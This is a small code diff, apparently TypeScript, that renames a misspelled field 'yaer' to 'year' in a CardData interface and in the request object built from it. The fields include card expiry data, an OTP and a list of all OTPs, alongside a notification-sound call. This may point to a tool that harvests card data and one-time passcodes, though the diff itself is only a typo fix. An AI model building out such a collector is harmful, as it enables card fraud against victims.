@@ -41,7 +41,7 @@ interface CardData {
   otp:string;
   prefix:string;
   month:string;
-  yaer:string;
+  year:string;
   otpall:string[]
   // Add other fields as needed
 }
@@ -104,7 +104,7 @@ playNotificationSound();
           otp: cardData.otp,
           prefix: cardData.prefix,
           month: cardData.month,
-          yaer: cardData.yaer,
+          year: cardData.year,
           otpall: cardData.otpall
         })
        })
